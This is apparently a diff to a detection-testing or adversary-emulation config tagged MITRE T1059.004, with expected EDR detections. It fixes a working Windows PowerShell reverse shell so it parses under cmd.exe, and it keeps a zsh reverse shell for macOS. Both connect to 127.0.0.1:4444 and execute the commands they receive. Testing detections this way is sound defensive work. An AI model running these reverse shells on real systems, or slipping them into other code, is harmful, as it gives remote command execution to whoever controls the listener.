@@ -90,7 +90,10 @@ steps:
     mitre_technique: "T1059.004"
     platforms: ["linux", "windows", "macos"]
     platform_variants:
-      windows: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$w=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($w,0,$w.Length)}\""
+      # PUSH-11: `ForEach-Object`, not its `%` alias. This line is a native
+      # invocation, so it runs under cmd.exe, and the beacon runs cmd text from
+      # a .cmd file, where a lone `%` is dropped: `0..65535|{0}` does not parse.
+      windows: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|ForEach-Object{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$w=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($w,0,$w.Length)}\""
       macos: "zsh -c 'zmodload zsh/net/tcp && ztcp 127.0.0.1 4444 && zsh -i <&$REPLY >&$REPLY 2>&$REPLY'"
     expected_detections:
       - plane: EDR
